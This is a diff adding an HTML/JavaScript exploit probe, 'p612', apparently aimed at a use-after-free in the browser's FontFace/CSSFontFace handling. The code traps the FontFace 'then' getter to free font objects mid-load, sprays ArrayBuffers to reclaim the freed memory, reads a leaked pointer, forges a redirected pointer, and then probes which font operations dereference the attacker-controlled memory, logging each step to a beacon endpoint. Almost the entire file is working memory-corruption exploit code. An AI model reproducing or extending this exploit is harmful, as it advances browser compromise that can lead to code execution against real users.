@@ -1,0 +1,265 @@
+<!--
+  p612: FontFace UAF method probe — test operations that dereference through
+  the CSSFontFace backing pointer: document.fonts.check(), property setters,
+  re-add, CSS style insertion, getComputedStyle with the font.
+  CRASH_CLASS: HIGH (WebProcess crash expected on some operations)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p612</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Arial);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon?m='+encodeURIComponent('P612-'+m)+'&t='+Date.now(),false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,lo,hi){wD(v,o,lo>>>0);wD(v,o+4,hi>>>0);}
+
+var stage=0;
+var lane1=null, hit1=-1, T1_lo=0, T1_hi=0;
+var lane2=null, hit2=-1;
+var font_a=null, font_b=null;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    font_a=this;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P1-FREE');
+    lane1=[];
+    for(var i=0;i<2048;i++) lane1.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane1.length;j++){
+      var v=lane1[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P1-SPRAY:'+lane1.length);
+    return;
+  }
+  if(stage===2){stage=3;
+    font_b=this;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('P2-FREE');
+    lane2=[];
+    for(var i=0;i<2048;i++) lane2.push(new Uint8Array(new ArrayBuffer(192)));
+    for(var j=0;j<lane2.length;j++){
+      var v=lane2[j]; wD(v,0,2); v[0x82]=3; v[0x85]=0xAA;
+    }
+    b('P2-SPRAY:'+lane2.length);
+    return;
+  }
+  return;
+},set:function(){}});
+
+function main(){
+b('BOOT');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){},function(){});
+
+// Phase 1
+setTimeout(function(){
+  if(!lane1){b('P1:NO-SPRAY');return;}
+  for(var i=0;i<lane1.length;i++){
+    var v=lane1[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit1=i; break; }
+  }
+  if(hit1<0){b('P1:NO-HIT');return;}
+  var v=lane1[hit1];
+  T1_lo=rD(v,0x58); T1_hi=rD(v,0x5C);
+  b('P1:HIT:lane='+hit1+',rc='+rD(v,0)+',T1=0x'+rQ(v,0x58));
+  for(var k=0x58;k<0x70;k++) v[k]=0;
+  b('P1:NULLED');
+}, 200);
+
+// GC1
+setTimeout(function(){
+  if(hit1<0) return;
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P1:GC-DONE');
+}, 600);
+
+// Phase 2
+setTimeout(function(){
+  if(hit1<0) return;
+  b('P1:POST-GC:rc='+rD(lane1[hit1],0));
+  stage=2;
+  var pb=new FontFace('pb','local(Helvetica)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){},function(){});
+  b('P2:STARTED');
+}, 1200);
+
+// Phase 2 find + redirect
+setTimeout(function(){
+  if(stage<3){b('P2:NO-TRAP');return;}
+  if(!lane2){b('P2:NO-SPRAY');return;}
+  for(var i=0;i<lane2.length;i++){
+    var v=lane2[i], rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    if(rc!==2||t0){ hit2=i; break; }
+  }
+  if(hit2<0){b('P2:NO-HIT');return;}
+  var v=lane2[hit2];
+  b('P2:HIT:lane='+hit2+',rc='+rD(v,0));
+  var forge_lo=T1_lo-0x50, forge_hi=T1_hi;
+  if(forge_lo<0){forge_lo+=0x100000000;forge_hi-=1;}
+  wD(v,0x58,forge_lo>>>0); wD(v,0x5C,forge_hi);
+  b('P2:REDIRECT:+58=0x'+rQ(v,0x58));
+}, 1700);
+
+// GC2
+setTimeout(function(){
+  if(hit2<0) return;
+  for(var i=0;i<50000;i++) new Object();
+  for(var i=0;i<500;i++) new ArrayBuffer(65536);
+  b('P2:GC-DONE');
+}, 2200);
+
+// Survival + method probes at 3500ms
+setTimeout(function(){
+  if(hit2<0){b('FAIL');return;}
+  var v2=lane2[hit2];
+  var rc=rD(v2,0);
+  if(rc!==2){b('FAIL:rc='+rc);return;}
+  b('SURVIVED');
+  if(!font_b){b('NO-FONTB');b('DONE');return;}
+
+  // === PHASE A: dump CSSFontFace offsets we control ===
+  // The reclaimed AB IS the CSSFontFace. Let's set up known values
+  // and see what operations read them.
+  var v=lane2[hit2];
+
+  // Keep refcount at +0x00 = 2
+  wD(v,0,2);
+  // Zero everything else to be safe
+  for(var k=4;k<192;k++) v[k]=0;
+  // Restore +0x80 = 0x30000 (size field, seems important)
+  wQ(v,0x80,0x30000,0);
+
+  b('ZEROED');
+
+  // === PHASE B: test document.fonts operations ===
+
+  // B1: document.fonts.check() — does it dereference CSSFontFace?
+  b('TRY-CHECK');
+  try{
+    var chk=document.fonts.check('1em pb');
+    b('CHECK:'+chk);
+  }catch(e){
+    b('CHECK:ERR:'+e.message);
+  }
+
+  // B2: document.fonts.has() — membership test
+  b('TRY-HAS');
+  try{
+    var has=document.fonts.has(font_b);
+    b('HAS:'+has);
+  }catch(e){
+    b('HAS:ERR:'+e.message);
+  }
+
+  // B3: iterate document.fonts
+  b('TRY-ITER');
+  try{
+    var cnt=0;
+    document.fonts.forEach(function(f){cnt++;});
+    b('ITER:count='+cnt);
+  }catch(e){
+    b('ITER:ERR:'+e.message);
+  }
+
+  // B4: document.fonts.add(font_b) — re-add the freed font
+  // This should try to register the CSSFontFace with the FontFaceSet
+  // and dereference through the backing pointer
+  b('TRY-ADD');
+  try{
+    document.fonts.add(font_b);
+    b('ADD:OK');
+  }catch(e){
+    b('ADD:ERR:'+e.message);
+  }
+
+  // B5: After re-add, check if fonts.check dereferences now
+  b('TRY-CHECK2');
+  try{
+    var chk2=document.fonts.check('1em pb');
+    b('CHECK2:'+chk2);
+  }catch(e){
+    b('CHECK2:ERR:'+e.message);
+  }
+
+  // === PHASE C: test property SETTERS ===
+  // Setting family might write through to CSSFontFace
+
+  b('TRY-SET-FAMILY');
+  try{
+    font_b.family='MARKER_FAM';
+    b('SET-FAMILY:OK');
+    // Read it back
+    b('GET-FAMILY:'+font_b.family);
+  }catch(e){
+    b('SET-FAMILY:ERR:'+e.message);
+  }
+
+  // Check if the setter wrote anything into our AB
+  var changed=[];
+  for(var off=0;off<192;off+=4){
+    var d=rD(v,off);
+    if(d!==0 && off!==0 && off!==0x80 && off!==0x84){
+      changed.push('+'+('00'+off.toString(16)).slice(-2)+'=0x'+d.toString(16));
+    }
+  }
+  if(changed.length>0) b('AB-CHANGED:'+changed.join(','));
+  else b('AB-UNCHANGED');
+
+  // === PHASE D: CSS rendering probe ===
+  // Create an element using this font and measure it
+  b('TRY-RENDER');
+  try{
+    var el=document.createElement('span');
+    el.style.fontFamily='pb, serif';
+    el.style.fontSize='100px';
+    el.textContent='WXYZ';
+    document.body.appendChild(el);
+    var w=el.offsetWidth;
+    var h=el.offsetHeight;
+    b('RENDER:w='+w+',h='+h);
+    // getComputedStyle
+    var cs=getComputedStyle(el);
+    b('CS-FONT:'+cs.fontFamily);
+    document.body.removeChild(el);
+  }catch(e){
+    b('RENDER:ERR:'+e.message);
+  }
+
+  // === PHASE E: test font_b.load() ===
+  b('TRY-LOAD');
+  try{
+    var p=font_b.load();
+    b('LOAD:'+typeof p);
+    if(p&&typeof p.then==='function'){
+      // Don't actually chain .then — it hits our trap
+      b('LOAD:IS-PROMISE');
+    }
+  }catch(e){
+    b('LOAD:ERR:'+e.message);
+  }
+
+  // === PHASE F: Read full AB state after all operations ===
+  b('FINAL-DUMP');
+  for(var off=0;off<192;off+=8){
+    var q=rQ(v,off);
+    if(q!=='0000000000000000') b('FINAL:+'+('00'+off.toString(16)).slice(-2)+'=0x'+q);
+  }
+
+  b('DONE');
+}, 3500);
+}
+
+setTimeout(main,0);
+</script></head><body>p612</body></html>
